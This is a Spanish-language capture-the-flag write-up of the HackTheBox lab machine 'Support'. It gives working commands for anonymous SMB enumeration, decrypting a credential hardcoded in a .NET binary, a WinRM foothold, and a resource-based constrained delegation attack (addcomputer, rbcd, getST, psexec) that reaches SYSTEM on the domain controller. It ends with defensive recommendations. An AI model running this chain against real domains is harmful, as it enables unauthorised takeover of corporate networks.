# HTB Support — Writeup

| Campo | Valor |
|---|---|
| Plataforma | HackTheBox |
| OS | Windows (Active Directory) |
| Dificultad | Easy |
| IP objetivo | 10.129.68.160 (`DC.SUPPORT.HTB`) |
| Técnicas | Null session SMB → reversing de binario .NET (cifrado propio débil) → credencial LDAP → disclosure de contraseña en atributo `info` → foothold WinRM → abuso de ACL (`GenericAll`) → RBCD → S4U2Proxy → Domain Admin |

## 1. Resumen

Support es una máquina Windows Active Directory cuyo compromiso completo no depende de ningún CVE, sino de una cadena de malas prácticas encadenadas: autenticación anónima habilitada en SMB, una herramienta interna distribuida con una credencial cifrada con un esquema propio (y débil) en lugar de un estándar probado, una segunda credencial guardada en texto plano en un campo de notas de Active Directory, y finalmente un permiso de control total (`GenericAll`) heredado por membresía de grupo sobre el objeto computadora del propio Domain Controller, explotable mediante Resource-Based Constrained Delegation.

Ninguno de estos cuatro problemas es por sí solo una vulnerabilidad "crítica" de manual, pero encadenados llevan de un usuario anónimo a `NT AUTHORITY\SYSTEM` en el DC.

## 2. Enumeración

### 2.1 Escaneo de puertos (todos)

```
sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.68.160
```

Puertos abiertos detectados: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 49664, 49667, 49678, 49690, 49706.

**Lectura inicial:** el conjunto 53/88/135/389/445/464/3268/9389 es la huella clásica de un **Domain Controller** de Active Directory (DNS, Kerberos, RPC, LDAP, SMB, kpasswd, Global Catalog, ADWS). Esto fija el objetivo: la máquina es un DC.

### 2.2 Extracción de puertos para el segundo escaneo

```
grep -oP '\d{1,5}(?=/open)' nmap/allports.gnmap | sort -un | xargs | tr ' ' ','
```

### 2.3 Escaneo de versiones/scripts sobre puertos abiertos

```
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49670,49677,49685,49708 -sCV -Pn -oA nmap/openports 10.129.68.160
```

Resultado relevante:

- OS: Windows (confirmado por CPE).
- `smb2-security-mode`: SMB signing **enabled and required** → descarta ataques de relay SMB contra este host como vector directo.
- `clock-skew: -1s` → reloj sincronizado, no hay problema para Kerberos.
- Puerto 5985 (WinRM) abierto → posible vector de acceso remoto una vez que se obtengan credenciales válidas.
- Puerto 9389 (ADWS) confirma rol de Domain Controller.

Con esta huella clásica de AD, el siguiente paso lógico es intentar enumeración anónima: LDAP (puerto 389) y null session SMB, ya que no se observan servicios no estándar expuestos.

### 2.4 Null session SMB — confirmación de dominio y hostname

```
nxc smb 10.129.68.160 -u Guest -p ""
```

Resultado: Windows Server 2022 Build 20348 x64, hostname `DC`, dominio `support.htb`, SMB signing activo, **Null Auth: True**. El usuario `Guest` autentica sin contraseña.

```
echo "10.129.68.160 support.htb" | sudo tee -a /etc/hosts
```

Se agrega el dominio a `/etc/hosts` para resolución local.

**Hallazgo:** null session SMB habilitada (autenticación anónima vía usuario `Guest`), permitiendo enumeración no autenticada del dominio. Es el primer eslabón de toda la cadena.

### 2.5 Enumeración de shares vía null session

```
nxc smb 10.129.68.160 -u Guest -p "" --shares
```

Shares visibles con el usuario anónimo:

| Share | Permisos | Observación |
|---|---|---|
| ADMIN$ | — | Remote Admin (estándar) |
| C$ | — | Default share (estándar) |
| IPC$ | READ | Remote IPC (estándar) |
| NETLOGON | — | Logon server share (estándar) |
| **support-tools** | READ | Share no estándar — "support staff tools" |
| SYSVOL | — | Logon server share (estándar) |

El share `support-tools` es el punto de interés: no es un share de AD por defecto.

### 2.6 Listado del share support-tools

```
nxc smb 10.129.68.160 -u Guest -p "" --spider support-tools --pattern .
```

Contenido: `7-ZipPortable_21.07.paf.exe`, `npp.8.4.1.portable.x64.zip`, `putty.exe`, `SysinternalsSuite.zip`, `UserInfo.exe.zip`, `windirstat1_1_2_setup.exe`, `WiresharkPortable64_3.6.5.paf.exe`.

La mayoría son herramientas portables conocidas y no llaman la atención. `UserInfo.exe.zip` destaca por ser el único binario sin nombre de proveedor reconocible, sugiriendo una herramienta custom del staff de soporte — candidato lógico a contener lógica propia (y posibles credenciales embebidas).

### 2.7 Descarga y análisis inicial de UserInfo.exe

```
nxc smb 10.129.68.160 -u Guest -p "" --share support-tools --get-file UserInfo.exe.zip UserInfo.exe.zip
mkdir UserInfo
unzip UserInfo.exe.zip -d UserInfo/
file UserInfo.exe
```

`UserInfo.exe` resulta ser un ensamblado **.NET/Mono** (PE32, Intel i386), acompañado de varias DLLs de `Microsoft.Extensions.*` — consistente con una app .NET moderna (probablemente .NET 6+ con `CommandLineParser`). Esto habilita decompilación directa (ILSpy/dnSpy) como siguiente paso, con alta probabilidad de encontrar strings de configuración, cadenas de conexión LDAP o credenciales hardcodeadas, dado que es una herramienta interna para consultar el directorio.

### 2.8 Decompilación de UserInfo.exe

Se decompiló el binario con **ILSpy** (AvaloniaILSpy), identificando dos clases relevantes:

**`UserInfo.Services.Protected`** — contiene una contraseña cifrada embebida y la rutina de descifrado:

```csharp
internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
        }
        return Encoding.Default.GetString(array2);
    }
}
```

El esquema es trivial: XOR byte a byte contra la clave ASCII `"armando"` (repetida), seguido de un XOR constante con `0xDF`.

**`UserInfo.Services.LdapQuery`** — consume esa contraseña para autenticar contra LDAP:

```csharp
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

Confirma que la credencial pertenece a la cuenta de dominio **`support\ldap`**.

Replicando el algoritmo (Python) sobre el string embebido:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
arr = bytearray(base64.b64decode(enc_password))
for i in range(len(arr)):
    arr[i] = (arr[i] ^ key[i % len(key)]) ^ 0xDF
print(arr.decode('latin-1'))
```

**Resultado:** `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

**Credencial obtenida:** `support.htb\ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

### 2.9 Validación de la credencial `support\ldap`

```
nxc ldap support.htb --dns-server 10.129.68.160 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M get-info-users
```

La credencial es válida y permite autenticación LDAP. El módulo `get-info-users` de NetExec (que vuelca el atributo `info`/descripción de los objetos usuario) devuelve:

```
User: support   Info: Ironside47pleasure40Watchful
```

**Hallazgo clave:** el atributo `info` (campo "Notes"/descripción en AD) del usuario `support` contiene una contraseña en texto plano. Es un patrón clásico de mala práctica: administradores guardando credenciales temporales o de servicio en campos de descripción de AD, visibles para cualquier cuenta con permisos de lectura básica sobre el directorio (como la cuenta de servicio `ldap` recién obtenida).

### 2.10 Foothold — acceso como `support` vía WinRM

Con la credencial `support.htb\support : Ironside47pleasure40Watchful` se valida acceso remoto por WinRM (puerto 5985, visto abierto en el escaneo inicial):

```
evil-winrm -i 10.129.68.160 -u support -p 'Ironside47pleasure40Watchful'
```

Sesión establecida exitosamente — **foothold confirmado** como `support.htb\support`.

```
dir ..\Desktop
type ..\Desktop\user.txt
```

Flag de usuario obtenida (contenido redactado en este writeup):

```
0******************************9
```

**Cadena de ataque hasta este punto:**

1. Null session SMB (`Guest` sin contraseña) → enumeración anónima habilitada.
2. Share `support-tools` de lectura anónima → descarga de `UserInfo.exe`.
3. Decompilación del binario → contraseña cifrada (XOR + clave hardcodeada) → credencial `support\ldap`.
4. Bind LDAP con `ldap` → lectura del atributo `info` de otros usuarios → contraseña en texto plano del usuario `support`.
5. WinRM con `support\support` → shell interactiva → `user.txt`.

## 3. Privilege Escalation / Lateral Movement

### 3.1 Enumeración con BloodHound

Con la credencial `support\ldap` se recolectaron datos para BloodHound:

```
nxc ldap support.htb --dns-server 10.129.68.160 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --bloodhound -c All
```

El grafo de ACLs reveló la ruta de ataque:

- El usuario `SUPPORT@SUPPORT.HTB` es miembro (`MemberOf`) del grupo **SHARED SUPPORT ACCOUNTS**.
- Ese grupo tiene permiso **`GenericAll`** sobre el objeto computadora **`DC.SUPPORT.HTB`** (el propio Domain Controller).

`GenericAll` sobre un objeto computadora es control total sobre ese objeto, incluyendo la capacidad de escribir el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`. Esto habilita un ataque de **Resource-Based Constrained Delegation (RBCD)**: cualquier identidad controlada por el atacante puede ser configurada como "delegada" para suplantar usuarios frente al DC vía Kerberos S4U2Proxy — incluyendo al Administrator.

**Pre-requisito explotado:** el dominio permite por defecto que usuarios autenticados creen hasta 10 cuentas de máquina (`ms-DS-MachineAccountQuota`), lo cual se aprovecha para crear una cuenta de computadora propia a controlar.

### 3.2 Creación de cuenta de máquina controlada

```
addcomputer.py -computer-name 'MELVIN$' -computer-pass 'P4$$w0rd' 'support.htb/support:Ironside47pleasure40Watchful'
```

Resultado: cuenta de máquina `MELVIN$` creada exitosamente, con contraseña conocida por el atacante.

```
Get-ADComputer -identity MELVIN
```

Confirma la creación: `SamAccountName: MELVIN$`, `Enabled: True`, SID `S-1-5-21-1677581083-3380853377-188903654-6101`.

### 3.3 Configuración de RBCD: DC permite que MELVIN$ delegue en su nombre

Usando el `GenericAll` del grupo `SHARED SUPPORT ACCOUNTS` (heredado vía membership de `support`) sobre el objeto `DC`:

```
rbcd.py -delegate-from 'MELVIN$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
```

Resultado: el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` de `DC$` (vacío previamente) se escribe exitosamente, autorizando a `MELVIN$` a actuar en nombre de otras identidades frente a `DC$` vía S4U2Proxy.

Verificación:

```
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

```
PrincipalsAllowedToDelegateToAccount : {S-1-5-21-1677581083-3380853377-188903654-6102}
```

(SID de `MELVIN$`.)

### 3.4 Abuso de S4U2Self/S4U2Proxy — ticket de servicio como Administrator

```
getST.py -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.htb/MELVIN$:P4$$w0rd'
```

Se obtiene un Service Ticket (TGS) válido para el SPN `cifs/dc.support.htb`, suplantando (`impersonate`) al usuario `administrator`, guardado en `administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`.

### 3.5 Uso del ticket — ejecución de comandos como SYSTEM/DA en el DC

```
export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
psexec.py -k -no-pass dc.support.htb -dc-ip 10.129.68.160
```

Autenticación Kerberos con el ticket robado contra el servicio `ADMIN$`/SVCManager del DC → shell interactiva como `NT AUTHORITY\SYSTEM` en el controlador de dominio.

```
type C:\Users\Administrator\Desktop\root.txt
```

Flag de root obtenida (redactada):

```
7******************************b
```

**Compromiso total del dominio confirmado** (Domain Admin / SYSTEM en el DC).

## 4. Cadena de ataque completa

1. Null session SMB anónima habilitada → enumeración sin credenciales.
2. Share `support-tools` de lectura anónima → descarga de `UserInfo.exe`.
3. Reversing del binario → esquema de cifrado propio débil (XOR + clave hardcodeada) → credencial `support\ldap`.
4. Bind LDAP con `ldap` → contraseña en texto plano en atributo `info` del usuario `support`.
5. WinRM con `support\support` → foothold, `user.txt`.
6. BloodHound (con `ldap`) → `support` ∈ grupo `SHARED SUPPORT ACCOUNTS` → `GenericAll` sobre el objeto computadora `DC`.
7. Creación de cuenta de máquina `MELVIN$` (machine account quota).
8. Abuso de `GenericAll` → configuración de RBCD (`MELVIN$` delega en `DC$`).
9. S4U2Self/S4U2Proxy → ticket de servicio como `administrator` para `cifs/dc.support.htb`.
10. `psexec.py` con el ticket → shell SYSTEM en el DC → `root.txt`.

## 5. Flags

| Flag | Valor (redactado) |
|---|---|
| user.txt | `0******************************9` |
| root.txt | `7******************************b` |

## 6. Lecciones / Takeaways

- **Null session SMB no es "solo informativo".** En este box fue el primer eslabón de toda la cadena: sin él, el share `support-tools` nunca se habría podido listar sin credenciales. Siempre vale la pena intentar `-u '' -p ''` / `Guest` antes de asumir que hace falta una credencial.
- **"Cifrado" propio ≈ texto plano.** Un esquema custom (XOR + clave hardcodeada en el mismo binario) no es cifrado, es ofuscación trivial. Cualquier binario distribuido a clientes/usuarios finales debe asumirse decompilable; nunca hay que embeber secretos, cifrados o no, en el artefacto.
- **El atributo `info`/descripción de AD es un lugar real donde aparecen credenciales.** Vale la pena volcarlo sistemáticamente (`-M get-info-users` en NetExec, o LDAP crudo) en cualquier engagement de AD, incluso con una cuenta de bajo privilegio.
- **`GenericAll` sobre un objeto computadora = control total**, incluyendo la capacidad de montar RBCD sin necesitar ser dueño de ninguna cuenta con SPN propio. Combinado con la cuota de creación de cuentas de máquina que casi todo dominio deja en su valor por defecto (10), cualquier usuario autenticado "de bajo privilegio" con ese ACL sobre un host es, en la práctica, capaz de comprometer ese host.
- **BloodHound después de la primera credencial, siempre.** La ruta de escalada (grupo → ACL sobre el DC) no era visible desde la enumeración LDAP manual; el grafo de relaciones es lo que la expuso en segundos.

## 7. Notas defensivas (qué hubiera detenido esta cadena)

- Deshabilitar la autenticación anónima/null session en SMB (`RestrictAnonymous` / políticas de red) habría cortado el acceso inicial al share.
- Restringir permisos de lectura anónima sobre shares no esenciales, y no distribuir herramientas internas con credenciales embebidas de ningún tipo (usar un vault/secret manager en su lugar).
- Auditar y limpiar el atributo `info`/descripción de todos los objetos usuario del directorio; nunca usarlo como almacenamiento de contraseñas.
- Revisar y reducir ACLs de grupos sobre objetos computadora sensibles (especialmente Domain Controllers); `GenericAll`/`GenericWrite` de un grupo de "cuentas compartidas de soporte" sobre un DC es una configuración de alto riesgo que debería auditarse con BloodHound periódicamente.
- Bajar `ms-DS-MachineAccountQuota` a 0 para usuarios sin necesidad legítima de unir equipos al dominio, reduciendo la superficie de ataques tipo RBCD/relay.
